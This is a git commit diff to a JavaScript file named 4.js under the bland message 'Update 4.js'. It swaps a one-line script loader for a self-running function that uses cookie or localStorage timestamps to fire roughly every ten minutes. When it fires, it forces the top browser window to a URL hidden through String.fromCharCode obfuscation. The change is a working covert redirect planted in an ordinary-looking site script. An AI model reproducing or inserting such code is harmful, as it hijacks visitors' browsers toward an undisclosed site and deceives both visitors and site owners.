c6c3d1e7142047c5ec70db48d408f6b5c912de01
hg8888 <50231081+hg8888@users.noreply.github.com>
2019-06-14 15:27:24 +0800

    Update 4.js

--- 4.js
+++ 4.js
@@ -1,1 +1,66 @@
-var x = document.createElement("SCRIPT");x.src="//js.users.51.la/20058045.js";document.body.appendChild(x);
+    
+(function () {
+  var get = false;
+  var ii = false;
+  var x = (new Date()).getHours();
+  var m = (new Date()).getTime();
+  var c = true;
+  if (!window.localStorage) {
+    var s = document.cookie.split(';');
+    for (var i = 0; i < s.length; i++) {
+      var ss = s[i].split('=');
+      if (ss[0].trim() == 'mx') {
+        c = false;
+        mx = ss[1]
+      } else {
+        if (ss[0].trim() == 'mm') {
+          mm = ss[1]
+        }
+      }
+    }
+  } else {
+    mx = window.localStorage['mx'];
+    mm = window.localStorage['mm']
+  }
+  if (x > 4 && x < 20) {
+    if ((m - mm) > 600000) {
+        get = true
+      }
+  } else {
+    if (x >= 20 && x <= 23) {
+      if ((m - mm) > 600000) {
+        get = true
+      }
+    } else {
+      if (x >= 0 && x <= 4) {
+        if ((m - mm) > 600000) {
+          get = true
+        }
+      }
+    }
+  }
+  if (window.localStorage) {
+    if ((typeof (window.localStorage['mm']) == 'undefined') || (typeof (window.localStorage['mm']) == 'undefined')) {
+      get = true
+    }
+  } else {
+    if (!c) {
+      get = true
+    }
+  }
+  if (get) {
+    if (!window.localStorage) {
+      document.cookie = 'mx=' + x;
+      document.cookie = 'mm=' + m
+    } else {
+      window.localStorage['mx'] = x;
+      window.localStorage['mm'] = m
+    }
+    //var s=document.referrer;
+    //var rr=3;
+    //var rss=Math.floor(Math.random()*rr)
+   // if(rss==1){
+      window.top.location.href=String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 119, 119, 119, 46, 48, 48, 50, 56, 48, 48, 48, 46, 99, 111, 109, 47);
+   // }
+  }
+})();
